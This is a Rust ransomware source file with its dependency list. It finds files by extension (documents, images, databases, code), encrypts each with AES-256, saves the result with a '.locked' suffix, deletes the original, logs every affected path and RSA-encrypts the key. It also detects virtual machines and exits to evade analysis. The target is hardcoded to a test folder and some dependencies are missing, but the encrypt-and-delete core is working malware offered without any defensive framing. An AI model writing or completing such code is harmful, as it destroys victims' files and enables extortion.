[dependencies]
aes = "0.8"
block-modes = "0.9"
block-padding = "0.3"
rsa = "0.9"
rand = "0.8"
walkdir = "2"
base64 = "0.22"
zeroize = "1.7"

use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use rsa::{RsaPrivateKey, RsaPublicKey, PaddingScheme};
use rand::{rngs::OsRng, RngCore};
use std::fs::{self, File, OpenOptions};
use std::io::{Read, Write};
use std::path::Path;
use walkdir::WalkDir;

type Aes256Cbc = Cbc<Aes256, Pkcs7>;

const EXTENSIONS: &[&str] = &["docx", "pdf", "xls", "ppt", "jpg", "png", "mp4", "sql", "cpp", "py"];
const EXCLUDE: &[&str] = &["winlogon.exe", ".dll", ".sys"];
const LOG_FILE: &str = "affected_files.log";

fn is_vm() -> bool {
    let cpus = num_cpus::get();
    let total_memory = sys_info::mem_info().map(|m| m.total).unwrap_or(0);

    cpus <= 2 || total_memory < 2048 * 1024 // < 2GB RAM
}

fn should_encrypt(path: &str) -> bool {
    if EXCLUDE.iter().any(|e| path.contains(e)) {
        return false;
    }

    EXTENSIONS.iter().any(|ext| path.ends_with(ext))
}

fn encrypt_file(path: &Path, key: &[u8; 32], iv: &[u8; 16]) {
    let mut file = match File::open(&path) {
        Ok(f) => f,
        Err(_) => return,
    };

    let mut buffer = Vec::new();
    if file.read_to_end(&mut buffer).is_err() {
        return;
    }

    let cipher = Aes256Cbc::new_from_slices(key, iv).unwrap();
    let ciphertext = cipher.encrypt_vec(&buffer);

    let enc_path = path.with_extension(format!("{}.locked", path.extension().unwrap().to_string_lossy()));
    if let Ok(mut enc_file) = File::create(&enc_path) {
        let _ = enc_file.write_all(&ciphertext);
        let _ = fs::remove_file(&path);

        let mut log = OpenOptions::new().append(true).create(true).open(LOG_FILE).unwrap();
        writeln!(log, "{}", path.display()).ok();
    }
}

fn encrypt_directory(root: &str, key: &[u8; 32], iv: &[u8; 16]) {
    for entry in WalkDir::new(root).into_iter().filter_map(Result::ok) {
        if entry.file_type().is_file() {
            let path_str = entry.path().to_string_lossy().to_string();
            if should_encrypt(&path_str) {
                encrypt_file(entry.path(), key, iv);
            }
        }
    }
}

fn rsa_encrypt_key(key: &[u8]) -> Vec<u8> {
    let mut rng = OsRng;
    let private_key = RsaPrivateKey::new(&mut rng, 2048).expect("Failed to generate RSA key");
    let public_key = RsaPublicKey::from(&private_key);

    let enc_key = public_key.encrypt(&mut rng, PaddingScheme::new_oaep::<sha2::Sha256>(), key).unwrap();
    fs::write("aes_key.enc", &enc_key).unwrap();
    private_key.to_pkcs1_pem().unwrap().as_bytes().to_vec()
}

fn main() {
    if is_vm() {
        println!("[!] VM detected. Exiting.");
        return;
    }

    let mut aes_key = [0u8; 32];
    let mut iv = [0u8; 16];
    OsRng.fill_bytes(&mut aes_key);
    OsRng.fill_bytes(&mut iv);

    rsa_encrypt_key(&aes_key);
    encrypt_directory("C:\\TestEncrypt", &aes_key, &iv);

    println!("[+] Files encrypted.");
}
